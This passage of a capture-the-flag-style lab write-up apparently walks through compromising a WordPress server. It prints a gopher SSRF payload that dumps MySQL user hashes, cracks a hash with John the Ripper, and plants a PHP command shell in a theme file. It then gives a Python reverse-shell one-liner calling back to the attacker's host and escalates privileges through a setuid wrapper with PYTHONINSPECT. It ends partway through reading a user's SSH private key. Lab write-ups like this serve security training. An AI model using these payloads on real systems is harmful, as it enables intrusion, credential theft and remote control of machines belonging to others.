</span></span><span class=line><span class=cl>gopher://127.0.0.1:3306/_%ac%00%00%01%85%a2%3f%00%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%77%70%5f%6d%79%73%71%6c%5f%75%73%65%72%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%04%39%32%30%36%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%07%31%30%2e%31%2e%33%37%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%30%00%00%00%03%73%65%6c%65%63%74%20%75%73%65%72%5f%6c%6f%67%69%6e%2c%75%73%65%72%5f%70%61%73%73%20%66%72%6f%6d%20%77%70%5f%64%62%2e%77%70%5f%75%73%65%72%73%01%00%00%00%01
</span></span></code></pre></td></tr></table></div></div><p>By filling the &ldquo;URL&rdquo; input of <code>test.php</code> with our ugly payload, there is a nice return in front of our eyes:</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/articles/realgsmoveinsilencelikelasagna/red_11.png data-srcset="/lib/images/articles/realgsmoveinsilencelikelasagna/red_11.png, /lib/images/articles/realgsmoveinsilencelikelasagna/red_11.png 1.5x, /lib/images/articles/realgsmoveinsilencelikelasagna/red_11.png 2x" data-sizes=auto alt=/lib/images/articles/realgsmoveinsilencelikelasagna/red_11.png title=/lib/images/articles/realgsmoveinsilencelikelasagna/red_11.png></p><p>Credentials stored in the database are:</p><table><thead><tr><th>username</th><th>hash</th></tr></thead><tbody><tr><td>eddiethehead</td><td>$P$Bi423VbUyNs7iWzYNNDqPBdisIiL.D0</td></tr></tbody></table><h3 id=offline-bruteforce>Offline bruteforce</h3><p>Having a hash, we can try to break it, testing all the possibilities. If it doesn&rsquo;t work, I can try to upload a webshell via our SSRF</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>host $ <span class=nb>echo</span> <span class=s2>&#34;</span><span class=nv>$P$Bi423VbUyNs7iWzYNNDqPBdisIiL</span><span class=s2>.D0&#34;</span> &gt; <span class=nb>hash</span> 
</span></span><span class=line><span class=cl>host $ john <span class=nb>hash</span> --wordlist<span class=o>=</span>rockyou.txt 
</span></span></code></pre></td></tr></table></div></div><p>Nothing relevant after few minutes. Odie put a strong password or the password is not in the rockyou wordlist.</p><p><code>John</code> is able to change wordlists content following preset customization rules. Modifying <code>rockyou</code> will take to long, I decided to do my own wordlist, containing only 8 words:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>eddiethehead
</span></span><span class=line><span class=cl>ironmaiden
</span></span><span class=line><span class=cl>admin
</span></span><span class=line><span class=cl>root
</span></span><span class=line><span class=cl>ensibs
</span></span><span class=line><span class=cl>test
</span></span><span class=line><span class=cl>administrator
</span></span><span class=line><span class=cl>wordpress
</span></span></code></pre></td></tr></table></div></div><p>I want to maximize my chances, I decide to use all of John&rsquo;s customization rules:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>host $ john <span class=nb>hash</span> --wordlist<span class=o>=</span>wordlist --rule<span class=o>=</span>all   
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Warning: detected <span class=nb>hash</span> <span class=nb>type</span> <span class=s2>&#34;phpass&#34;</span>, but the string is also recognized as <span class=s2>&#34;phpass-opencl&#34;</span>
</span></span><span class=line><span class=cl>Use the <span class=s2>&#34;--format=phpass-opencl&#34;</span> option to force loading these as that <span class=nb>type</span> instead
</span></span><span class=line><span class=cl>Loaded <span class=m>1</span> password <span class=nb>hash</span> <span class=o>(</span>phpass <span class=o>[</span>phpass <span class=o>(</span><span class=nv>$P</span>$ or <span class=nv>$H</span>$<span class=o>)</span> 128/128 AVX 4x4x3<span class=o>])</span>
</span></span><span class=line><span class=cl>Will run <span class=m>8</span> OpenMP threads
</span></span><span class=line><span class=cl>Press <span class=s1>&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span class=k>for</span> status
</span></span><span class=line><span class=cl>eddiethehead123  <span class=o>(</span>?<span class=o>)</span>
</span></span><span class=line><span class=cl>1g 0:00:00:00 DONE <span class=o>(</span>2018-12-27 00:53<span class=o>)</span> 1.298g/s 935.0p/s 935.0c/s 935.0C/s Eddiethehead46..eddiethehead7777
</span></span><span class=line><span class=cl>Use the <span class=s2>&#34;--show&#34;</span> option to display all of the cracked passwords reliably
</span></span><span class=line><span class=cl>Session completed
</span></span></code></pre></td></tr></table></div></div><p>Great! It worked! The hash is broken, the password is: <code>eddiethehead123</code>.</p><h3 id=rce-to-reverse-shell>RCE to reverse shell</h3><p>It&rsquo;s time for me to log on the WordPress administration panel:</p><table><thead><tr><th>username</th><th>password</th></tr></thead><tbody><tr><td>eddiethehead</td><td>eddiethehead123</td></tr></tbody></table><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/articles/realgsmoveinsilencelikelasagna/red_12.png data-srcset="/lib/images/articles/realgsmoveinsilencelikelasagna/red_12.png, /lib/images/articles/realgsmoveinsilencelikelasagna/red_12.png 1.5x, /lib/images/articles/realgsmoveinsilencelikelasagna/red_12.png 2x" data-sizes=auto alt=/lib/images/articles/realgsmoveinsilencelikelasagna/red_12.png title=/lib/images/articles/realgsmoveinsilencelikelasagna/red_12.png></p><p>It works like a charm! Now it&rsquo;s time to execute commands directly on the Linux host. To do that, I just have to edit or upload a PHP page. Nowadays, it&rsquo;s possible to edit the current CMS theme through the web view.</p><blockquote><p>Appearences > Themes > Editor</p></blockquote><p>On the right panel, we can see the &ldquo;inc&rdquo; folder, inside it, there are some PHP files such as <code>customizer.php</code>. I will inject arbitrary PHP code in this page:</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/articles/realgsmoveinsilencelikelasagna/red_13.png data-srcset="/lib/images/articles/realgsmoveinsilencelikelasagna/red_13.png, /lib/images/articles/realgsmoveinsilencelikelasagna/red_13.png 1.5x, /lib/images/articles/realgsmoveinsilencelikelasagna/red_13.png 2x" data-sizes=auto alt=/lib/images/articles/realgsmoveinsilencelikelasagna/red_13.png title=/lib/images/articles/realgsmoveinsilencelikelasagna/red_13.png></p><p>This little PHP line will runs the data sent through the &ldquo;x&rdquo; GET parameter. Here is an example:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>host $ curl <span class=s2>&#34;http://192.168.122.147/wp-content/themes/rock-band/inc/customizer.php?x=id&#34;</span>                                  
</span></span><span class=line><span class=cl><span class=nv>uid</span><span class=o>=</span>33<span class=o>(</span>www-data<span class=o>)</span> <span class=nv>gid</span><span class=o>=</span>33<span class=o>(</span>www-data<span class=o>)</span> <span class=nv>groups</span><span class=o>=</span>33<span class=o>(</span>www-data<span class=o>)</span>
</span></span></code></pre></td></tr></table></div></div><p>Perfect, it&rsquo;s time to execute a reverse shell. The standard method (using <code>netcat</code>) is no longer available since the &ldquo;-e&rdquo; argument has been removed. The <code>/dev/tcp/IP/PORT</code> trick is not always possible too.</p><p>But there are a lot of possibilities to runs a reverse shell, it works with PHP or Python for example. I will not modify the PHP pages any further, in order to avoid damaging the integrity of the site.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>host $ curl <span class=s2>&#34;http://192.168.122.147/wp-content/themes/rock-band/inc/customizer.php?x=which%20nc&#34;</span>
</span></span><span class=line><span class=cl>-&gt; No netcat
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>host $ curl <span class=s2>&#34;http://192.168.122.147/wp-content/themes/rock-band/inc/customizer.php?x=which%20python&#34;</span>
</span></span><span class=line><span class=cl>/usr/bin/python
</span></span></code></pre></td></tr></table></div></div><p>Python is present on the remote target, nice. Let&rsquo;s go get the payload on pentestmonkey:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>python -c <span class=s1>&#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;10.0.0.1&#34;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&#34;/bin/sh&#34;,&#34;-i&#34;]);&#39;</span>
</span></span></code></pre></td></tr></table></div></div><p>I just have to replace the IP and port with mine. Here is the final payload:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>http://192.168.122.147/wp-content/themes/rock-band/inc/customizer.php?x=python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;192.168.122.1&#34;,3615));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&#34;/bin/sh&#34;,&#34;-i&#34;]);
</span></span></code></pre></td></tr></table></div></div><p>And now, just listen on your 3615 TCP port using <code>netcat</code>:</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/articles/realgsmoveinsilencelikelasagna/red_14.gif data-srcset="/lib/images/articles/realgsmoveinsilencelikelasagna/red_14.gif, /lib/images/articles/realgsmoveinsilencelikelasagna/red_14.gif 1.5x, /lib/images/articles/realgsmoveinsilencelikelasagna/red_14.gif 2x" data-sizes=auto alt=/lib/images/articles/realgsmoveinsilencelikelasagna/red_14.gif title=/lib/images/articles/realgsmoveinsilencelikelasagna/red_14.gif></p><p>It&rsquo;s possible to have a fully interactive shell from this shitty one, using Python and other trick: <a href=https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/ target=_blank rel="noopener noreffer">https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/</a></p><p>I ever presented these tricks in <strong>Santhacklaus</strong> CTF writeups: <a href=https://maki.bzh//courses/blog/writeups/santhacklaus2018/#exploitation-1 target=_blank rel="noopener noreffer">https://maki.bzh//courses/blog/writeups/santhacklaus2018/#exploitation-1</a></p><p>But I love GIFs, so here is again :D</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/articles/realgsmoveinsilencelikelasagna/red_15.gif data-srcset="/lib/images/articles/realgsmoveinsilencelikelasagna/red_15.gif, /lib/images/articles/realgsmoveinsilencelikelasagna/red_15.gif 1.5x, /lib/images/articles/realgsmoveinsilencelikelasagna/red_15.gif 2x" data-sizes=auto alt=/lib/images/articles/realgsmoveinsilencelikelasagna/red_15.gif title=/lib/images/articles/realgsmoveinsilencelikelasagna/red_15.gif></p><h3 id=from-www-data-to-odie>From www-data to odie</h3><p>There is no <code>sudo</code>, no vulnerable processes, but let&rsquo;s take a look about suid binaries and scripts:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>rev-shell $ find / -perm -4000 <span class=p>|</span> xargs grep -v <span class=s2>&#34;Permission denied&#34;</span>
</span></span><span class=line><span class=cl>Binary file /usr/lib/openssh/ssh-keysign matches
</span></span><span class=line><span class=cl>Binary file /usr/lib/policykit-1/polkit-agent-helper-1 matches
</span></span><span class=line><span class=cl>Binary file /usr/lib/dbus-1.0/dbus-daemon-launch-helper matches
</span></span><span class=line><span class=cl>Binary file /usr/lib/eject/dmcrypt-get-device matches
</span></span><span class=line><span class=cl>Binary file /usr/local/bin/ensibsproject matches
</span></span><span class=line><span class=cl>Binary file /usr/bin/chsh matches
</span></span><span class=line><span class=cl>Binary file /usr/bin/newgrp matches
</span></span><span class=line><span class=cl>Binary file /usr/bin/gpasswd matches
</span></span><span class=line><span class=cl>Binary file /usr/bin/pkexec matches
</span></span><span class=line><span class=cl>Binary file /usr/bin/chfn matches
</span></span><span class=line><span class=cl>Binary file /usr/bin/passwd matches
</span></span><span class=line><span class=cl>Binary file /usr/bin/sudo matches
</span></span><span class=line><span class=cl>Binary file /bin/umount matches
</span></span><span class=line><span class=cl>Binary file /bin/su matches
</span></span><span class=line><span class=cl>Binary file /bin/ping matches
</span></span><span class=line><span class=cl>Binary file /bin/mount matches
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>rev-shell $ ls -la /usr/local/bin/ensibsproject
</span></span><span class=line><span class=cl>-rwsrwsr-t <span class=m>1</span> odie odie <span class=m>8640</span> Dec <span class=m>27</span> 05:30 /usr/local/bin/ensibsproject
</span></span></code></pre></td></tr></table></div></div><p>Olala, by chance, Odie puts sticky bit on a binary! What a chance we have!</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=https://media.giphy.com/media/l0Iy8OYsxXo4PlCIU/giphy.gif data-srcset="https://media.giphy.com/media/l0Iy8OYsxXo4PlCIU/giphy.gif, https://media.giphy.com/media/l0Iy8OYsxXo4PlCIU/giphy.gif 1.5x, https://media.giphy.com/media/l0Iy8OYsxXo4PlCIU/giphy.gif 2x" data-sizes=auto alt=https://media.giphy.com/media/l0Iy8OYsxXo4PlCIU/giphy.gif title=https://media.giphy.com/media/l0Iy8OYsxXo4PlCIU/giphy.gif></p><p>Ok, now, what this binary is doing:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>rev-shell $ /usr/local/bin/ensibsproject
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl> _____           _ _                                  _    
</span></span><span class=line><span class=cl><span class=p>|</span> ____<span class=p>|</span>_ __  ___<span class=o>(</span>_<span class=o>)</span> <span class=p>|</span>__  ___   ___  ___  ___ _ __ ___<span class=p>|</span> <span class=p>|</span>_  
</span></span><span class=line><span class=cl><span class=p>|</span>  _<span class=p>|</span> <span class=p>|</span> <span class=s1>&#39;_ \/ __| | &#39;</span>_ <span class=se>\/</span> __<span class=p>|</span> / __<span class=p>|</span>/ _ <span class=se>\/</span> __<span class=p>|</span> <span class=s1>&#39;__/ _ \ __| 
</span></span></span><span class=line><span class=cl><span class=s1>| |___| | | \__ \ | |_) \__ \ \__ \  __/ (__| | |  __/ |_  
</span></span></span><span class=line><span class=cl><span class=s1>|_____|_| |_|___/_|_.__/|___/_|___/\___|\___|_|  \___|\__| 
</span></span></span><span class=line><span class=cl><span class=s1> _ __  _ __ ___ (_) ___  ___| |_                           
</span></span></span><span class=line><span class=cl><span class=s1>| &#39;</span>_ <span class=se>\|</span> <span class=s1>&#39;__/ _ \| |/ _ \/ __| __|                          
</span></span></span><span class=line><span class=cl><span class=s1>| |_) | | | (_) | |  __/ (__| |_                           
</span></span></span><span class=line><span class=cl><span class=s1>| .__/|_|  \___// |\___|\___|\__|                          
</span></span></span><span class=line><span class=cl><span class=s1>|_|           |__/                                         
</span></span></span><span class=line><span class=cl><span class=s1>
</span></span></span><span class=line><span class=cl><span class=s1>Traceback (most recent call last):
</span></span></span><span class=line><span class=cl><span class=s1>  File &#34;/home/odie/project.py&#34;, line 16, in &lt;module&gt;
</span></span></span><span class=line><span class=cl><span class=s1>    import requests
</span></span></span><span class=line><span class=cl><span class=s1>ImportError: No module named requests
</span></span></span><span class=line><span class=cl><span class=s1>
</span></span></span><span class=line><span class=cl><span class=s1>$ strings /usr/local/bin/ensibsproject | grep py                       
</span></span></span><span class=line><span class=cl><span class=s1>/home/odie/project.py
</span></span></span><span class=line><span class=cl><span class=s1>
</span></span></span><span class=line><span class=cl><span class=s1>rev-shell $ cat /home/odie/project.py
</span></span></span><span class=line><span class=cl><span class=s1>#!/usr/bin/python
</span></span></span><span class=line><span class=cl><span class=s1>
</span></span></span><span class=line><span class=cl><span class=s1>print &#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s1> _____           _ _                                  _    
</span></span></span><span class=line><span class=cl><span class=s1>| ____|_ __  ___(_) |__  ___   ___  ___  ___ _ __ ___| |_  
</span></span></span><span class=line><span class=cl><span class=s1>|  _| | &#39;</span>_ <span class=se>\/</span> __<span class=p>|</span> <span class=p>|</span> <span class=s1>&#39;_ \/ __| / __|/ _ \/ __| &#39;</span>__/ _ <span class=se>\ </span>__<span class=p>|</span> 
</span></span><span class=line><span class=cl><span class=p>|</span> <span class=p>|</span>___<span class=p>|</span> <span class=p>|</span> <span class=p>|</span> <span class=se>\_</span>_ <span class=se>\ </span><span class=p>|</span> <span class=p>|</span>_<span class=o>)</span> <span class=se>\_</span>_ <span class=se>\ \_</span>_ <span class=se>\ </span> __/ <span class=o>(</span>__<span class=p>|</span> <span class=p>|</span> <span class=p>|</span>  __/ <span class=p>|</span>_  
</span></span><span class=line><span class=cl><span class=p>|</span>_____<span class=p>|</span>_<span class=p>|</span> <span class=p>|</span>_<span class=p>|</span>___/_<span class=p>|</span>_.__/<span class=p>|</span>___/_<span class=p>|</span>___/<span class=se>\_</span>__<span class=p>|</span><span class=se>\_</span>__<span class=p>|</span>_<span class=p>|</span>  <span class=se>\_</span>__<span class=p>|</span><span class=se>\_</span>_<span class=p>|</span> 
</span></span><span class=line><span class=cl> _ __  _ __ ___ <span class=o>(</span>_<span class=o>)</span> ___  ___<span class=p>|</span> <span class=p>|</span>_                           
</span></span><span class=line><span class=cl><span class=p>|</span> <span class=s1>&#39;_ \| &#39;</span>__/ _ <span class=se>\|</span> <span class=p>|</span>/ _ <span class=se>\/</span> __<span class=p>|</span> __<span class=p>|</span>                          
</span></span><span class=line><span class=cl><span class=p>|</span> <span class=p>|</span>_<span class=o>)</span> <span class=p>|</span> <span class=p>|</span> <span class=p>|</span> <span class=o>(</span>_<span class=o>)</span> <span class=p>|</span> <span class=p>|</span>  __/ <span class=o>(</span>__<span class=p>|</span> <span class=p>|</span>_                           
</span></span><span class=line><span class=cl><span class=p>|</span> .__/<span class=p>|</span>_<span class=p>|</span>  <span class=se>\_</span>__// <span class=p>|</span><span class=se>\_</span>__<span class=p>|</span><span class=se>\_</span>__<span class=p>|</span><span class=se>\_</span>_<span class=p>|</span>                          
</span></span><span class=line><span class=cl><span class=p>|</span>_<span class=p>|</span>           <span class=p>|</span>__/                                         
</span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>import requests
</span></span></span><span class=line><span class=cl><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>try:
</span></span></span><span class=line><span class=cl><span class=s2>    requests.get(&#39;http://www-ensibs.univ-ubs.fr/fr/formations/formations/diplome-d-ingenieur-DI/sciences-technologies-sante-STS/diplome-d-ingenieur-cyberdefense-program-icyb00-213.html&#39;)
</span></span></span><span class=line><span class=cl><span class=s2>    flag = 1
</span></span></span><span class=line><span class=cl><span class=s2>except:
</span></span></span><span class=line><span class=cl><span class=s2>    flag = 0
</span></span></span><span class=line><span class=cl><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>if flag:
</span></span></span><span class=line><span class=cl><span class=s2>    print &#34;</span>ENSIBS Cyberdefense website is up!<span class=s2>&#34;
</span></span></span></code></pre></td></tr></table></div></div><p>Odie really loves his school, he even made a script for checking the disponibility of the website. Beautiful.</p><p>However, it&rsquo;s a python script and the binary seems to be used as a wrapper to execute this script. Fortunately, it got the sticky bit, which means that if we can execute commands through this binary, then we will have rights of <strong>odie</strong> user on the system.</p><p>Environment variable <code>PYTHONINSPECT</code> will force the inspection mode. It means a python console will appear at this end of python script execution. With the binary&rsquo;s rights ;)</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>rev-shell $ <span class=nv>PYTHONINSPECT</span><span class=o>=</span><span class=m>1</span> /usr/local/bin/ensibsproject                
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl> _____           _ _                                  _    
</span></span><span class=line><span class=cl><span class=p>|</span> ____<span class=p>|</span>_ __  ___<span class=o>(</span>_<span class=o>)</span> <span class=p>|</span>__  ___   ___  ___  ___ _ __ ___<span class=p>|</span> <span class=p>|</span>_  
</span></span><span class=line><span class=cl><span class=p>|</span>  _<span class=p>|</span> <span class=p>|</span> <span class=s1>&#39;_ \/ __| | &#39;</span>_ <span class=se>\/</span> __<span class=p>|</span> / __<span class=p>|</span>/ _ <span class=se>\/</span> __<span class=p>|</span> <span class=s1>&#39;__/ _ \ __| 
</span></span></span><span class=line><span class=cl><span class=s1>| |___| | | \__ \ | |_) \__ \ \__ \  __/ (__| | |  __/ |_  
</span></span></span><span class=line><span class=cl><span class=s1>|_____|_| |_|___/_|_.__/|___/_|___/\___|\___|_|  \___|\__| 
</span></span></span><span class=line><span class=cl><span class=s1> _ __  _ __ ___ (_) ___  ___| |_                           
</span></span></span><span class=line><span class=cl><span class=s1>| &#39;</span>_ <span class=se>\|</span> <span class=s1>&#39;__/ _ \| |/ _ \/ __| __|                          
</span></span></span><span class=line><span class=cl><span class=s1>| |_) | | | (_) | |  __/ (__| |_                           
</span></span></span><span class=line><span class=cl><span class=s1>| .__/|_|  \___// |\___|\___|\__|                          
</span></span></span><span class=line><span class=cl><span class=s1>|_|           |__/                                         
</span></span></span><span class=line><span class=cl><span class=s1>
</span></span></span><span class=line><span class=cl><span class=s1>Traceback (most recent call last):
</span></span></span><span class=line><span class=cl><span class=s1>  File &#34;/home/odie/project.py&#34;, line 16, in &lt;module&gt;
</span></span></span><span class=line><span class=cl><span class=s1>    import requests
</span></span></span><span class=line><span class=cl><span class=s1>ImportError: No module named requests
</span></span></span><span class=line><span class=cl><span class=s1>&gt;&gt;&gt; import os; os.system(&#39;</span>/bin/bash -p<span class=err>&#39;</span><span class=o>)</span>
</span></span></code></pre></td></tr></table></div></div><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/articles/realgsmoveinsilencelikelasagna/red_16.gif data-srcset="/lib/images/articles/realgsmoveinsilencelikelasagna/red_16.gif, /lib/images/articles/realgsmoveinsilencelikelasagna/red_16.gif 1.5x, /lib/images/articles/realgsmoveinsilencelikelasagna/red_16.gif 2x" data-sizes=auto alt=/lib/images/articles/realgsmoveinsilencelikelasagna/red_16.gif title=/lib/images/articles/realgsmoveinsilencelikelasagna/red_16.gif></p><p>The &ldquo;-p&rdquo; argument of bash allow conserving rights. Otherwise, we would have had a bash as <strong>www-data</strong>, not really interesting in our case.</p><p>Let&rsquo;s see if the user <strong>odie</strong> got an SSH private key. It would be more convenient with a SSH shell, and more discreet.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>rev-shell $ ls -la /home/odie/
</span></span><span class=line><span class=cl>total 64d
</span></span><span class=line><span class=cl>drwxr-xr-x <span class=m>5</span> odie odie  <span class=m>4096</span> Dec <span class=m>27</span> 05:50 .
</span></span><span class=line><span class=cl>drwxr-xr-x <span class=m>3</span> root root  <span class=m>4096</span> Dec <span class=m>26</span> 20:18 ..
</span></span><span class=line><span class=cl>-rw------- <span class=m>1</span> odie odie  <span class=m>6335</span> Dec <span class=m>27</span> 05:37 .bash_history
</span></span><span class=line><span class=cl>-rw-r--r-- <span class=m>1</span> odie odie   <span class=m>220</span> Dec <span class=m>26</span> 20:18 .bash_logout
</span></span><span class=line><span class=cl>-rw-r--r-- <span class=m>1</span> odie odie  <span class=m>3526</span> Dec <span class=m>26</span> 20:18 .bashrc
</span></span><span class=line><span class=cl>drwx------ <span class=m>3</span> odie odie  <span class=m>4096</span> Dec <span class=m>27</span> 05:09 .cache
</span></span><span class=line><span class=cl>drwx------ <span class=m>4</span> odie odie  <span class=m>4096</span> Dec <span class=m>27</span> 05:09 .local
</span></span><span class=line><span class=cl>-rw-r--r-- <span class=m>1</span> odie odie   <span class=m>675</span> Dec <span class=m>26</span> 20:18 .profile
</span></span><span class=line><span class=cl>drwxr-xr-x <span class=m>2</span> odie odie  <span class=m>4096</span> Dec <span class=m>27</span> 05:46 .ssh
</span></span><span class=line><span class=cl>-rw------- <span class=m>1</span> odie odie <span class=m>10478</span> Dec <span class=m>27</span> 05:40 .viminfo
</span></span><span class=line><span class=cl>-rwxr-xr-x <span class=m>1</span> odie odie   <span class=m>934</span> Dec <span class=m>27</span> 05:08 project.py
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>rev-shell $ cat /home/odie/.ssh/id_rsa
</span></span><span class=line><span class=cl>-----BEGIN RSA PRIVATE KEY-----
</span></span><span class=line><span class=cl>MIIEpAIBAAKCAQEA1VMOMwtecWKwr4SnW41bi7ALoelNH6mQ2s5jNlbwSa6iBCmG
